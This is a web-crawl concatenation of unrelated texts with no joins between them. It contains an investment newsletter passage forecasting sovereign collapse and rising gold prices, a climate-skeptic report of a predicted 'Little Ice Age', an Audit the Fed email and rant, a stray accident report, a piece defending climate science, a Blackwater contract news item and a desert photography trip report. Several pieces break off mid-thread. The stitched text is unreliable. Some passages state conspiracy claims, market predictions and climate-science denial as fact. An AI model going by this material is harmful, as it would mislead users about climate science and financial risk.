Talk about a carry trade BLOWING UP .
July will be a severe test of crisis management as these banks are increasingly SHUT out of the short - term lending markets or have to pay up to roll .
Can you say another year of unlimited borrowing from the ECB ?
In a recent Wall Street Journal entitled : Deutsch Bank Deserves Bite Bair Gave it , Peter Eavis reported : NEGATIVE tier - one capital ?
It is not isolated to these two ; it is an epidemic amongst the biggest players .
In the a previous Tedbits ( May 20 , 2010 ) I outlined the NEW special - purpose vehicle to RESCUE / bailout and how special - purpose vehicles are only used for DECEPTION ; let ’s look at a graphic of the deal from a recent wall street journal :
This is being done to keep the NEW debt off their individual balance sheets and circumvent the Euro zone rules which prohibit buying the debt of individual EU countries .
This is a picture of public - sector deception in the light of day .
When will the markets call their bluff ?
When they try to issue the first tranche of that debt is my guess .
Let ’s see nothing from the respective EU governments except guarantees for the special - purpose vehicle ( all the guarantees are from morally and fiscally bankrupt nations and public serpents ) , virtually none of the governments have budget deficits less than 6 % of GDP ( see graphic above ) and their countries are not GROWING , so the debts are compounding at an inconceivable rate .
All have OTHER OFF BALANCE - SHEET obligations which are many multiples of GDP ( which are unpayable as growth is ZERO ) , and of course , the ratings agencies will rate them AAA .
Politicians will lean on them to do so , this is also known as creating “ Fairy tales ” .
Anyone who buys these offerings will get what they deserve : NOTHING .
All of the countries are raising taxes , directly or indirectly on what few places in the private sector actually have profits or incomes and they are refusing to cut the public sectors in any meaningful manner .
I will now take you back to a quote from Bill Gross of PIMCO , the world ’s largest bond manager :
" If core sovereigns such as the U.S. , Germany , U.K. , and Japan ' absorb ' more and more credit risk , then the credit spreads and yields of these sovereigns should look more and more like the markets that they guarantee .
The Kings , in other words , in the process of increasingly shedding their clothes , begin to look more and more like their subjects .
Kings and serfs begin to share the same castle . " -
Bill Gross
Bingo , and it actually is a SAND castle at this point .
The waves of history are about to wash over them like the tides .
Hanging like Damocles ’ sword over these FRAUDSTER ’s , they shall soon learn history ’s lessons , as will investors who have placed their faith in banksters and Big wire houses ( investment banks ) .
Developed world governments and their financial systems are operating in BANKRUPTCY ; I hope you are not on the other side of this trade as you are now a creditor , not an investor …..
Although there is one thing you can count on them to do …
PRINT the MONEY out of thin air and hand it back to you …
No entrepreneur or business owner in their right mind would hire an employee or plan an expansion without knowing the cost of their labor , new healthcare mandates , availability of credit or the cost of energy and unreported tax increases ( VAT taxes , Medicare surcharges , the destruction of capital gains taxes , etc. , the list is too long to cover , but be assured there are dozens of new taxes ) .
When those issues are UNKNOWABLE uncertainty reigns SUPREME and the willingness to take risks vanishes , because there is no way to calculate the odds of success with those VARIABLES .
There will be no jobs or small business growth until these things are dealt with .
Investors are in the same BOAT .
They are confused and misled by banksters , main stream media and Investment banks ; knowing past advice has failed and seeing that the prescriptions for future investing are no different than previously in a world of RELATIVE returns .
This is the road to disaster and poverty for people trying to store capital and wealth in paper assets .
How many years will it be before they emerge again is the question ?
The answer is as long as it takes for these changes to be knowable .
Take a look at this on- minute video of Glen Beck : www.youtube.com/watch?v=0PE4b0VFzYI
It outlines FDR ’s New Deal and its regulatory straightjackets , and then compares them to the current healthcare legislation ; from the looks of it , the current lawmakers are dwarfing what took place then .
THIS IS A MUST SEE VIDEO to gain perspective .
Then think about FINANCIAL reform ( 2,000 pages of NEW LAWS ) and energy legislation which will inevitably emerge from the accident in the gulf .
Cloaks of complexity , regulatory buffoonery and corruption are descending on the social welfare states of the G10 .
It will be years , if not a decade or more , to get over the destruction caused by this legislation .
It took over 20 years for the destruction implemented by the Roosevelt administration ’s NEW DEAL to be repealed and for growth to resume .
These idiots are dwarfing those mistakes so you can expect it to take at least equally as long this time around .
The only businesses expanding are those on the GOVERNMENT GRAVY train .
They are about to hit a brick wall just as Greece has done .
Crony capitalists and public - sector unions are the only beneficiaries -- and the private sectors of the respective countries are on the menu , as the something - for - nothing societies eat the productive to FEED the welfare state .
When they hit the BRICK wall then the fun really begins , political assumptions built up since 1971 are about to meet REALITY and it will BITE .
Have you ever heard a politician ADMIT a MISTAKE and correct it ?
I know I have n’t .
The present leadership inside the Beltway and G10 capitals has engineered the perfect storm of destruction .
In 1982 , Margaret Thatcher and Ronald Reagan had reduced taxes and regulation and dismantled much of the Welfare State , thus setting the table for growth and wealth creation .
Conversely , since 2008 : socialists have implemented the largest intrusion into the private sector in history , they are politicizing the financial sector even more , radically expanding entitlements , taxes and the social safety net .
One approach -- the road to recovery , the other -- road to RUIN .
Public serpents and their special interest supporters have chosen the latter .
I am tired of hearing misinformation in the mainstream press .
Is gold a bubble ?
No .
I will provide a few graphs to illustrate the history of other bubbles in comparison and the fundamentals versus paper creation .
First let ’s look at a chart illustrating some recent bubbles ( from Bruce Pile of www.goodstockinvesting.blog) and compare the present move in gold :
‘ Now let ’s look at them numerically , from Clusterstock :
Now let ’s take a look at gold prices in context to money supply creation ( courtesy of www.qbamco.com) versus the real gold stock .
This is the fundamental illustration of what is unfolding IN FRONT OF US :
This is a fabulous illustration , thanks again to www.qbamco.com .
What is it saying ?
The fundamentals are in place to match any of the previous outlined bubbles !!!
But also that we are in the infancy of the coming move .
Remember , currencies do n’t float they just SINK in purchasing power at different rates , take a look at the uniformity of the theft of purchasing power by MAJOR central banks and their public serpent partners in crime who are printing money OUT OF THIN AIR to fund their redistributionist schemes , stealing the purchasing power of your money while it sits in the bank :
Those gains are the reciprocal of how much purchasing power your money has lost while it sits in SAFE cash and US Treasuries .
In other words : put negative signs in front of those numbers to see how you have been FLEECED in terms of purchasing power .
The purchasing power of paper FIAT currencies is in FREEFALL .
Technically , the gold charts IN ALL CURRENCIES show ORDERLY long - term , secular bull markets commencing over 10 years ago .
Take a look at this chart of gold since 2006 :
This is the picture of an orderly advance , where gold spends long periods consolidating its gains and building corrective technical formations , then the pattern becomes active and the market goes higher in an orderly manner .
Based upon the last two technical patterns ( in this chart , the reverse head and shoulders ) , both of which are active , they project gold ’s next price move to the $ 1,350 - $ 1,450 area .
Question : Can gold back and fill and then go down before going higher ?
Of course it can .
That is the very definition of an orderly market advance .
Let ’s keep in mind another fundamental fact : Emerging - world central banks are sitting on 6.3 TRILLION ( Dollars , Euros , British Pounds , and Swiss Francs etc. ) of reserves in soon - to - be increasingly worthless developed world currencies , and less than $ 100 billion of it is in gold .
Then , think of the $ 200 TRILLION sitting in financial assets around the world and the percentage of them in gold , ( illustrated by this fabulous chart by www.agorafinancial.com):
Do you think they might increasingly want to exchange progressively - worthless FIAT paper money ( IOU ’s of bankrupt countries ) for TIMELESS , real money sometime soon ?
I do !
In addition to this fundamentally bullish picture , add the fact of the GARGANTUAN short positions held by the biggest banks in the world ; they will soon face their waterloo , as they are overwhelmed by a tsunami of cash seeking safety and lighting a short covering bonfire to their balance sheets as well .
That ’s a mighty small door to safety , the sooner you arrive the better you will fare .
At this point , GOLD IS NOT A BUBBLE .
The bubble is in front of us , not in the rear view mirror .
Remember :
The greatest transfer of wealth from those that hold it in paper to those that do n’t is under way …
Wait until the BIG money PANICS .
When will they WAKE UP ?
A Crack - up boom looms …
Look no further than these two charts of the ECRI economic index ( from David Rosenberg www.Gluskinsheff.com), you can easily see the wolf waves ( whipsawing megaphone formations ) signifying the wild and EXPANDING oscillation in the economy caused by fiat currency and credit creation ( either too hot or too cold ) :
Wolves eat people and these Wolves will eat economies .
You can expect this to be coming true , heading into the last half of 2010 ; the economy of the US is heading into freefall right behind the EURO ZONE .
An economic bloodbath approaches .
In conclusion : Black swans are firmly in flight and the FAT lady is singing .
Catastrophe looms , courtesy of the chosen one and his minions in congress .
The potential opportunities to profit from this unfolding maelstrom are infinite .
This is not DOOM and Gloom , it is reality , learn to deal with it and prosper , fail too and learn the lessons of history in REAL time .
Everything is mispriced and will move UP and DOWN to price in unfolding REALITIES .
Buy and hold is DEAD , and paper is poison .
Applied Austrian economics is the recipe for success .

Public servants in G10 capitals are destroying your futures and implementing the death of their economies ON PURPOSE to use the crisis to SEIZE power and what ’s left of their respective private sectors .
It is the something - for - nothings eating their own future .
It ’s going to be a HOT summer with lots of FIREWORKS .
Job and income growth ?
What job growth ?
Incentives matter as does the ability to take a calculated risk in hiring a new employee or starting a new business .
Why take a risk when there is no reward for doing so ?
There is no reward and there will be none ; socialists never understand human behavior except at the lowest levels of society where people are desperate to escape POVERTY , thus becoming the mob which populous politicians prey upon , even though they are the culprits of the economic malaise .
The consequence of their economic illiteracy and insatiable greed for power over others , along with their progressive policies .
The problem does not lie with your small - business - owner neighbors , aka the RICH , as your public serpents tell you .
But do n’t worry , they will just pull back their animal spirits and wait for better economic weather .
Battles loom between the public and private sectors to see who serves who .
The policies of Insolvency are firmly in place in the social welfare states and are being added by the day , and it spells ECONOMIC doom .
Global growth is falling off a cliff in the developed world and the structural reform REQUIRED will not be considered until the economic collapse is complete .

Why has the dollar not crashed yet as you keep reminding us it should for the past several years ?
20 May 10 - CHICAGO – Habibullo Abdussamatov , head of space research at Pulkovo Astronomical Observatory in St. Petersburg , Russia , predicts that a new " Little Ice Age " could begin in just four years .
I sat just ten feet away from Abdussamatov as he made this startling assertion at the Heartland Institute 's 4th International Conference on Climate Change in Chicago just two days ago .
Jerome R. Corsi from World Net Daily covered the proceedings exceedingly well , and I am quoting or paraphrasing him extensively here .
In a two - part video recorded at the conference by WND ( link below ) , Abdussamatov explains that average annual sun activity has experienced an accelerated decrease since the 1990s .
Habibullo Abdussamatov
Head of the Russian - Ukrainian project " Astrometria " on the Russian segment of the International Space Station , Abdussamatov 's theory is that " long - term variations in the amount of solar energy reaching the Earth are the main and principal reasons driving and defining the whole mechanism of climatic changes from the global warmings to the Little Ice Ages to the big glacial periods . "
In his speech , Abdussamatov took on advocates of the theory of man-caused warming who want to curtail our use of hydrocarbon fuels .
He contended , instead , that a reasonable way to combat coming cooling trends would be " to maintain economic growth in order to adapt to the upcoming new Little Ice Age in the middle of the 21st century . "
Sun 's activity determines temperatures
Abdussamatov argues that total sun irradiance , or TSI , is the primary factor responsible for causing climate variations on Earth , not carbon dioxide .
Carbon dioxide is " not guilty , " says Abdussamatov .
" As for what lies ahead in the coming decades , it is not catastrophic warming , but a global , and very prolonged temperature drop . "
Abdussamatov pointed to the English astronomer Walter Maunder , who noticed that sunspots had been generally absent from 1645 to 1715 .
That period coincided with the middle and coldest part of the Little Ice Age , which began around 1650 and extended through 1850 .
" There is now an unavoidable advance toward a global decrease , a deep temperature drop comparable to the Maunder minimum , " he wrote .
" Already there are signs of the future deep temperature drop . "
" The observed global warming of the climate of the Earth is not caused by the anthropogenic emissions of greenhouse gasses , but by extraordinarily high solar intensity that extended over virtually the entire past century . "
" Future decrease in global temperature will occur even if anthropogenic ejection of carbon dioxide into the atmosphere rises to record levels .
" The implementation of the Kyoto Protocol aimed to rescue the planet from the greenhouse effect should be put off at least 150 years . "
I have the utmost respect for the courageous scientists who presented
at this convention .

Some 700 policymakers , opinion leaders , elected national and state legislators ,

Earlier I received an email from AuditTheFed.com :
Dear Supporter of Transparency , According to our sources on the Hill , Senator Bernie Sanders has unfortunately given in to pressure from the White House and Chris Dodd and stripped out the Paul - Grayson language from his Fed transparency amendment .
What Sanders is now proposing is essentially the Watt amendment the Audit the Fed Coalition opposed last year in the House .
Talking Points Memo reports that , “ In order to allay some of the White House ’s and the Fed ’s concerns , Sanders has agreed to limit the scope of what the Government Accountability Office would be allowed to audit–but his plan will still require thorough review of all the Fed ’s emergency lending , beginning December 1 , 2007 . ” Call Senator Sanders ’ office at ( 202 ) 224-5141 and tell him how you feel about this last - minute compromise .
Click here for contact information for your senators and urge them to oppose this compromise .
Tell them it ’s time to support a standalone vote on S. 604 , Audit the Fed .
A vote could come even late tonight or early tomorrow .
Let your senators know where you stand right away .
The American people deserve a full , thorough audit .
Sincerely , The Audit the Fed Coalition
The Wall Street Journal writes Plan for Congressional Audits of Fed Dies in Senate :
Last - minute maneuvering in the Senate allowed the Federal Reserve to sidestep legislation that would have exposed its interest - rate decision - making to congressional auditors .
Pressure from the Obama administration led Senate lawmakers to alter a provision pushed by Sen. Bernie Sanders ( I. , Vt. ) that was gaining momentum despite opposition from the Treasury and the Fed .
It would have largely repealed a 32 - year - old law that shields Fed monetary policy from congressional auditors .
The compromise , endorsed by Senate Banking Committee Chairman Christopher Dodd ( D. , Conn . ) and the Treasury , would require the Fed to disclose more details about its lending during the financial crisis .
It would also require a one - time audit of those loans and a one - time review of Fed governance .
A formal vote was pushed back until next week .
Thursday ’s Senate showdown came after senators on the left and right joined forces to support Mr. Sanders ’ provision .
“ At a time when our entire financial system almost collapsed , we cannot let the Fed operate in secrecy any longer , ” Mr. Sanders said .
“ The American people have a right to know . ”
But Fed Chairman Ben Bernanke , while insisting on a commitment to “ openness ” at the Fed , said in a letter to Congress the Sanders measure would “ seriously threaten monetary policy independence , increase inflation fears and market interest rates , and damage economic stability and job creation . ”
More * Letter : Bernanke Outlines His Opposition
* Letter : Volcker Outlines His Opposition Journal Community Deputy Treasury Secretary Neal Wolin , in a statement , endorsed the revisions to the Sanders provision , saying they would provide a comprehensive audit of the Federal Reserve Board ’s operations in response to the financial crisis , “ while preserving the existing protections of the Federal Reserve ’s independence with respect to monetary policy . ”
A House bill sponsored by Rep. Ron Paul ( R. , Texas ) that passed in December contains a proposal similar to the original Sanders measure .
If the Senate bill passes , it will need to be reconciled in a conference committee .
That keeps the pressure on the Fed alive for the coming months .
The original Sanders measure stated that it should n’t be “ construed as interference in or dictation of monetary policy . ”
But the Fed and administration warned that would allow auditors to interview Fed policy makers and staffers about monetary policy , thereby allowing congressional critics to pressure the Fed and undermine its independence .
Like most other capitalist democracies , U.S. politicians have given the central bank considerable latitude to control interest rates on the theory that elected politicians are prone to keep rates too low to get more growth during their terms at the cost of more inflation later .
Although sponsors of legislation insisted that was n’t their intent , the Fed and its allies said otherwise .
“ It ’s a chilling kind of circumstance , ” former Fed Chairman Paul Volcker , an Obama adviser , said in an interview .
“ The more you have no clear boundaries about what ’s appropriate and what ’s inappropriate , you castrate the decision - making process .
That ’s true for any organization , but it ’s particularly true when you get into the sensitivities of monetary policy that can generate speculative waves in financial markets and speculation in people ’s minds , ” said Mr. Volcker , who also urged lawmakers to eliminate the audit provision .
Who ’s Who in the Senate Financial Overhaul Learn more about key players in the Senate ’s discussion .
View Interactive Anil Kashyap , an economist at the University of Chicago ’s Booth School of Business , stressed that independent central banks need to be insulated from politics and make decisions several months ahead of expected trends .
“ There are times when you have to start raising interest rates before the economy ’s recovering .
If you ’re going to get audited while you do that , you know you ’re going to be slower — meaning we ’re going to tolerate higher inflation . ”
Before the last - minute compromise , the Fed ’s foes appeared to be winning , and got a major boost when Senate Majority Leader Harry Reid ( D. , Nev. ) said he would side with Mr. Sanders .
Mr. Bernanke , meanwhile , returned to Washington Thursday afternoon after a morning speech in Chicago to continue pressing for changes to the Sanders bill .
In the past few days , Mr. Bernanke has spoken to at least a half - dozen senators to argue the Fed ’s case that the bill would deeply damage the Fed ’s credibility and ability to make tough decisions about interest rates .
At least half a dozen Obama administration officials joined the blitz , including Treasury Secretary Timothy Geithner — a former Fed official — and Rahm Emanuel , the White House chief of staff .
Administration aides credited Mr. Dodd with pushing back against the original amendment and developing an acceptable alternative .
New York Fed President William Dudley also advocated to scale back the scope of the auditing .
He was among those arguing that ongoing reviews of the Fed ’s regular lending to financial institutions would stigmatize the program and cripple the Fed ’s role as the nation ’s lender of last resort .
The Senate beat back another amendment with populist tinges , defeating 61 - 33 a provision that would have put strict caps on the size of the nation ’s banks .
Offered by a bloc of liberal Democrats , it would have capped at 10 % the limit on the nation ’s total insured deposits any single bank holding company could carry .
It would have also set a 6 % leverage limit for banks and capped their non-deposit liabilities at 2 % of U.S. gross domestic product .
I think it is about time to realize how ridiculously funny this whole farce is .
First off :
The gang that is the Congress is not going to push through measures that will seriously jeopardize its beautiful money printing machine .
It ’s simply inconceivable for to happen in any meaningful way .
I once thought they could , too , I have come to realize that they wo n’t .
The temptation of political action is enormous .
I , too , fell for it for a long time .
The alternatives are hard to accept and just as counter - intuitive as many libertarian solutions seem to unenlightened people in the realm of economics .
We are all perfectly aware of the mechanism of credit expansion and how the Fed is at the root of financial crises that will occur again and again .
But do you seriously think president Obama or any other one of these narcissistic , self aggrandizing officials will ever give a flying rats ass ??
Haha , it ’s unthinkable !
An article such as the one above is just another display of the blatant and shameless lies and falsehoods that politicians and clueless academics will deliberately spread with no reservations whatsoever .
We ’ve heard this nonsense again and again and it ’s just about time we stop pretending that this is a debate .
It ’s not .
It ’s a bunch of clowns frantically taking mental craps into the minds of a deluded populace to justify a ponzi scheme that will collapse sooner or later of its own accord .
It ’s funny at best .
But it ’s not deserving of a shred of our precious time that we could spend educating those around us about the truth and living our principles in our own lives !
By pretending that it is an intellectual debate we sanction a fundamentally corrupt process .
This is not what we should be doing .
We should n’t justify the systematic looting , theft and defrauding of the majority of the people , in short government , via attempts to participate in it .
It has n’t worked for centuries and trying it over and over again is really the mother of all abusive relationships .
The Audit The Fed efforts are a particularly tragic example .
Here we are , fighting day in day out , donating enormous amounts of money , effort , etc. … for what ?
In order to get the government to deign to have it ’s counterfeiting institution to produce a few more pieces of paper to report Congress ?
Do you seriously think this is going to strip this gang off its powers even one tiny bit ??
Even if it did , all it would do introduce 1000s of new “ regulations ” that will grant more powers .
Millions of innocent and poor people have died over he past years in unconstitutional wars , millions have been thrown in to prison cells for owning or selling some piece of vegetation , our and our kids ’ futures have been mortgaged off to foreign nations , corrupt union thugs , and bureaucrats , around 40 % of our income per year is taken from us at the point of a gun to support the gaping black hole that is the playground of bureaucratism , and we are fighting tooth and nail about a few pieces of paper ?
And on top of that , paper that will be submitted to Congress ??
I think we reasonable people should not degrade ourselves like that .
It costs too much time , effort , and nerves .
The purpose of life is happiness .
We should live our values , educate our friends and family , get the bad people out of our lives , make sure we raise loved , educated , reasonable children , and over time we will change the whole world in a way that is much more fundamental than adding to the demand for the business of paper production . :)

The 15 - month - old - who was with his grandmother and three - year - old brother - was sitting in his pram at Tooronga railway station at Malvern when it rolled off the platform and into the path of a city - bound train at 11.13 am today .

Joe Bastardi , who goes by the title “ expert senior forecaster ” at AccuWeather , has a modest proposal .
Virtually every major scientific body in the world has concluded that the planet is warming , and that greenhouse - gas emissions are the main cause .
Bastardi , who holds a bachelor ’s degree in meteorology , disagrees .
His theory , which mixes volcanism , sunspots , and a sea- temperature trend known as the Pacific Decadal Oscillation , is that the earth is actually cooling .
Why do n’t we just wait twenty or thirty years , he proposes , and see who ’s right ?
This is “ the greatest lab experiment ever , ” he said recently on Bill O’Reilly ’s Fox News show .
Illustration by Tom Bachtell
Bastardi ’s position is ridiculous ( which is no doubt why he ’s often asked to air it on Fox News ) .
Yet there it was on the front page of the Times last week .
Among weathermen , it turns out , views like Bastardi ’s are typical .
A survey released by researchers at George Mason University found that more than a quarter of television weathercasters agree with the statement “ Global warming is a scam , ” and nearly two - thirds believe that , if warming is occurring , it is caused “ mostly by natural changes . ”
( The survey also found that more than eighty per cent of weathercasters do n’t trust “ mainstream news media sources , ” though they are presumably included in this category . )
Why , with global warming , is it always one step forward , two , maybe three steps back ?
A year ago , it looked as if the so - called climate debate might finally be over , and the business of actually addressing the problem about to begin .
In April , the Obama Administration designated CO 2 a dangerous pollutant , thus taking the first critical step toward regulating carbon emissions .
The following month , the Administration announced new fuel - efficiency standards for cars .
( These rules were finalized last week . )
In June , the House of Representatives passed a bill , named for its co-sponsors , Edward Markey and Henry Waxman , that called for reducing emissions seventeen per cent by 2020 .
Speaking in September at the United Nations , the President said that a “ new era ” had dawned .
“ We understand the gravity of the climate threat , ” he declared .
“ We are determined to act . ”
“ No , sorry , you ’ll still be dumb . ” Facebook
Twitter
Email
Shopping
Then , much like the Arctic ice cap , that “ new era ” started to fall to pieces .
The U.N. climate summit in Copenhagen in December broke up without agreement even on a possible outline for a future treaty .
A Senate version of the Markey - Waxman bill failed to materialize and , it ’s now clear , wo n’t be materializing anytime this year .
( Indeed , the one thing that seems certain not to be in a Senate energy bill is the economy - wide emissions reduction required by the House bill . )
Last week , despite the Senate ’s inaction , President Obama announced that he was opening huge swaths of the Atlantic and Alaskan coasts to oil drilling .
The White House billed the move as part of a “ comprehensive energy strategy , ” a characterization that , as many commentators pointed out , made no sense , since comprehensiveness is precisely what the President ’s strategy lacks .
As Josh Nelson put it on the blog EnviroKnow , “ Obama is either an exceptionally bad negotiator , or he actually believes in some truly awful policy ideas .
Neither of these possibilities bodes well . ”
As lawmakers dither , public support for action melts away .
In a Gallup poll taken last month , forty - eight per cent of respondents said that they believe the threat of global warming to be “ generally exaggerated . ”
This figure was up from thirty - five per cent just two years ago .
According to the same poll , only fifty - two per cent of Americans believe that “ most scientists believe that global warming is occurring , ” down from sixty - five per cent in 2008 .
The most immediate explanation for this disturbing trend is the mess that ’s come to be known as Climategate .
Here the situation is the reverse of what ’s going on in the troposphere : Climategate really is a hyped - up media phenomenon .
Late last year , hackers broke into the computer system at the Climatic Research Unit of Britain ’s University of East Anglia and posted online hundreds of private e-mails from scientists .
In the e-mails , C.R.U. researchers often express irritation with their critics — the death of one detractor is described as “ cheering news ” — and discuss ways to dodge a slew of what they consider to be nuisance Freedom of Information requests .
The e-mails were widely portrayed in the press and in the blogosphere as evidence of a conspiracy to misrepresent the data .
But , as a parliamentary committee appointed to investigate the matter concluded last week , this charge is so off base that it is difficult even to respond to : “ Insofar as the committee was able to consider accusations of dishonesty against CRU , the committee considers that there is no case to answer . ”
The e-mail brouhaha was followed by — and immediately confused with — another overblown controversy , about a mistake in the second volume of the U.N. Intergovernmental Panel on Climate Change ’s Fourth Assessment Report , from 2007 .
On page 493 of the nine - hundred - and - seventy - six - page document , it is asserted , incorrectly , that the Himalayan glaciers could disappear by 2035 .
( The report cites as a source for this erroneous information a report by the World Wildlife Fund . )
The screw - up , which was soon acknowledged by the I.P.C.C. and the W.W.F. , was somehow transformed by commentators into a reason to doubt everything in the three - volume assessment , including , by implication , the basic laws of thermodynamics .
The “ new scandal ( already awarded the unimaginative name of ‘ Glaciergate ’ ) raises further challenges for a scientific theory that is steadily losing credibility , ” James Heiser wrote on the Web site of the right - wing magazine New American .
No one has ever offered a plausible account of why thousands of scientists at hundreds of universities in dozens of countries would bother to engineer a climate hoax .
Nor has anyone been able to explain why Mother Nature would keep playing along ; despite what it might have felt like in the Northeast these past few months , globally it was one of the warmest winters on record .
The message from scientists at this point could n’t be clearer : the world ’s emissions trajectory is extremely dangerous .
Goofball weathermen , Climategate , conspiracy theories — these are all a distraction from what ’s really happening .
Which , apparently , is what we ’re looking for . ♦
Image caption Blackwater was banned from Iraq , ending operations in 2009
The head of CIA has defended awarding a large contract to the controversial security company formerly known as Blackwater .
The director of the CIA , Leon Panetta , said the company 's bid was US $ 26 m less than its nearest rival .
The contract , worth $ 100 m , is to provide security at US consulates in the cities of Herat and Mazar - e - Sharif .
Blackwater guards allegedly opened fire on unarmed civilians in Baghdad in 2007 killing 17 people .
In the wake of the killings , the company rebranded itself Xe Services .
The company ended its operations in Iraq in 2009 , in line with a ban by the government .
The US government said in January 2009 that it would not renew the company 's task orders .

The new contract with the company initialy runs for a year but could be extended to 18 months .
In a rare television interview with ABC News on Sunday , Leon Panetta said the CIA had come to rely on such companies to provide security for forward bases .
" [ Xe ] provided a bid that … underbid everyone else by about US $ 26 m .
And a panel that we had said that they can do the job , that they have shaped up their act .
So there really was not much choice but to accept that contract , " Mr Panetta explained .
As Blackwater the company provided the US government with bodyguards both in Afghanistan and Iraq .
It hit the headlines when four of its bodyguards were ambushed in the Iraqi city of Fallujah and their bodies left hanging from a bridge over the Euphrates River .
Earlier this month the company was put up for sale .
Photo Trip Report of ‘ White Pocket ’ located in the Paria Canyon – Vermilion Cliffs Wilderness area .
I believe that in order for person to find their true calling , ( no matter what that calling is ) they must first set out on the path that separates ego from the equation .
There are a many ways of creating this phenomena , but the main goal should be the complete removal of the stain of current human culture .
This is not a modern dilemma .
This is what man must deal with as he continues to draw himself farther away from the natural world he emerged from .
For my own body , in particular , putting myself in the atmosphere of a timeless place , untouched by human manipulation , is the best ticket there is …
Remote locations that few people venture to here in the Southwest seem to have a magnetic quality for me .
Add to that a beautiful , bizarre and other - worldly landscape , and I ’m planning the trip already .
The area known simply as ‘ the White Pocket ’ in northern Arizona fits that bill perfectly .
Just 6 miles east of Coyote Buttes South , ( another gorgeous and remote location itself )
White Pocket contains some of the most astonishing geology you will ever find anywhere on earth .
Like Coyote Buttes South , most of the formations are layered sandstone , made from different generations of sand dunes deposited hundreds of millions of years ago during the Jurassic period .
Geologists say that every time a new layer of dunes was blown onto an existing layer , the ones beneath it were compressed and hardened by groundwater minerals .
These crossbeds often have different colors because the mineral deposits in the groundwater ( sometimes rich in iron ) varied from generation to generation …
The formations at the White Pocket are distinctly different from the ones you ’ll see at Coyote Buttes because much of the top layer is as the name states : ‘ white ’ .
This is because the last generation of sand that solidified over the white pocket area was rich in silt .
All of that gives a fair idea of the basis behind how these formations came to be , but the truth is , nobody really knows exactly how the formations here came to take on such a chaotic appearance .
There are abundant signs of soft - sediment deformation , but in ways that are n’t normal .
I am obviously not a geologist , but I ’ve heard theories of earthquakes , floods and volcanic action during the sedimentation process …
If any of that means anything to you , that ’s great .
If not , that ’s ok too , because visual stimulation is something anyone should be able to enjoy , regardless of your interest in geology .
Although I ’d have to admit that this landscape may be too chaotic and random for some people ’s taste .
Supposedly the area was named by cowboys and ranchers who settled the land in the late 1800s and early 1900s .
‘ Pockets ’ generally referred to areas of hard rock in the desert where rainwater would collect .
Cattle still roam somewhat freely in the Pariah Canyon wilderness and the white pocket is still used as a water source by many animals traveling the sands from Autumn to Spring .
In the middle of the formations there is still the remnants of an old dam wall built by ranchers to help keep more water contained .
The formations here lack the perfect symmetry that has made “ the Wave ” in North Coyote Buttes so famous .
And because of that , it is much harder to photograph .
You can spend days here ( trust me I know firsthand ) and not even come close to capturing the pure cacophony of swirling rock the way your eye saw it .
I would need a week here to even begin to do this place justice photographically , and as I write this I am realizing that words do very little to explain the feeling you get when standing in the midst of these ancient monsters .
To me , there is something very special about desert areas with aesthetic appeal that also see very few human visitors .
The silence is deafening .
The environment unpredictable and inhospitable .
That is what attracts me to places like this rather than the better - known parks .
Take for example Zion National Park :
It is one of the most beautiful places on earth , but unless you ’re there during winter , you ’ll be constantly rubbing elbows with fellow photographers , hikers , old ladies with disposable cameras ( flashes on all the time ) , soccer moms , baseball dads , nature nuts , confused city folks , tourists of all kinds , bikers , and whining children who just want to go home and play Xbox ( among others ) .
Now do n’t get me wrong , I like the company of other people as much as the next misanthrope , but you have to admit there ’s something stripped away from the feeling of a wilderness area when it ’s been turned into an outdoor mall …
You ’ll get none of that in White Pocket or Coyote Buttes South .
There are no main roads that join landmarks together , no overlooks and no nearby lodging .
This is why I seek these sorts of places out .
And unfortunately that ’s why they are becoming more and more popular every year .
I should n’t complain since I am part of the problem : photographing the place and blogging about it .
But in the tradition of being an American citizen , I ’ll go ahead and complain anyway .
Getting there is n’t easy .
In fact , it can be completely impossible if you do n’t have a vehicle with high clearance and a good 4wd or Awd system .
The closest towns to this area are Page , Arizona to the east and Kanab , Utah to the west .
Both of these “ cities ” could be considered “ in the middle of nowhere ” to many people as it is , but then there ’s the venture from one of those towns ( take Page for example ) to the White Pocket itself which includes 35 miles on a 2 lane highway , followed by 20 miles on a rutted - out one lane dirt road and finishing up with a 15 - mile plow through the driest , deepest sandy back roads you ’ll probably ever encounter .
I wo n’t publish directions , but as the old saying goes -‘ seek and ye shall find ’ .
There are plenty of detailed directions to the White Pocket if you ’re willing to do a web search .
Another thing that ’s a plus about White Pocket is the fact that you do n’t need a permit to legally go there , unlike Coyote Buttes North and South .
This makes planning your trip a little bit easier .
Those wishing to legally obtain a permit for Coyote Buttes ( North especially ) have to jump through a series of hoops which is honestly a good thing in my opinion , because it keeps the hordes of tourists away .
With White Pocket , the last 10 miles of “ road ” are the hoops you have to jump through and that itself will discourage a lot of people .
Still , on my last visit , there were two other parties camping there besides mine , and an average of 3 to 4 vehicles a day came through for day - hikes .
The good thing is that most likely anyone you run into out there is going to be a decent person .
Most people visiting are serious photographers or nature enthusiasts / adventurists .
There is a feeling that the BLM may have to start issuing a permit system for the White Pocket in the future .
Only time will tell .
If you ’re going to visit the White Pocket or Coyote Buttes South , you are going to be driving through some very deep sand .
Do n’t even bother trying to get there in a passenger car .
You can get to the Coyote Buttes North trailhead in a small car , but you wo n’t make it to White Pocket .
I suggest bringing an air compressor and deflating your tires to around 18 - 20 psi .
This will help your vehicle glide over the sand a little better .
Use the air compressor to bring your tires back to normal psi when you return from the sandy roads .
A shovel is a must in case you get stuck .
The most difficult thing about these deep sand roads is that there are abrupt patches of extremely sharp , uneven rock here and there throughout the trip .
In order to get through the deep sand you need to keep up your momentum because without traction , you will get stuck in the sand if your vehicle stops .
–
But in order to get through the rocky parts of the road without blowing a tire ( like I did this last trip ) or bottoming out and damaging something crucial underneath , you have to slow to a crawl …
This means you have to keep your eyes open at all times and be ready to quickly slow down when the sand turns to a stairway of sharp rock .
This can be very nerve - racking ( or very fun , depending on how you look at it . )
I drive an 09 Subaru Forester which is an underrated and very capable off - road machine .
It has gotten me there and back twice now , but I have seen more than a couple pictures of American 4×4 trucks stuck in the deep Paria Sand .
Another thing to consider is bringing some extra floor mats or strips of old carpet in case you do get stuck …
These can be tied to your rear forks so that you can keep going through the deep sand once you get going again , without having to stop to pick them up and risk getting stuck again .
The hardest part of the drive is coming back from the White Pocket , about 2 miles from it - A steep winding hill that you will go down in order to get there .
The main difficulty is that at the bottom of this hill , there ’s an old dry creek rut that makes gaining momentum for the hill impossible .
But chances are that if you got there , you will make it back - no problem .
Obviously , there ’s no cell phone service out there , so keep that in mind when planning .
As stated before , photographing this place is not easy .
